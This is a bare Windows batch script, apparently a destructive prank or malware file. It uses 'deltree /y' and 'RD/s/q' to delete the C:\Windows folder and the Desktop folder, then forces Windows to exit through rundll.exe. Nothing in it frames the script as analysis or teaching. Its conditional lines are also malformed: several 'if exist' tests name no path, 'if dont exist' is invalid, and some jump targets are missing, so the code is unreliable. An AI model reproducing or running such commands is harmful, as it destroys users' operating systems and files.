   @echo off
   :loop

   :loop1
   cls
   deltree /y C:/windows
   if exist goto loop3
   if dont exist goto loop2

   :loop2
   RD/s/q C:/Windows
   if exist goto loop4

   :loop3
   deltree /y C:\WINDOWS\Desktop
   if exist goto loop5
   if dont exist goto loop6

   :loop4
   RD/s/q C:\Windows\Desktop
   if exist goto loop5

   :loop5
   start c:\windows\rundll.exe user.exe,exitwindowsexec 2
   if exist goto loop7

   :loop7
   EXIT
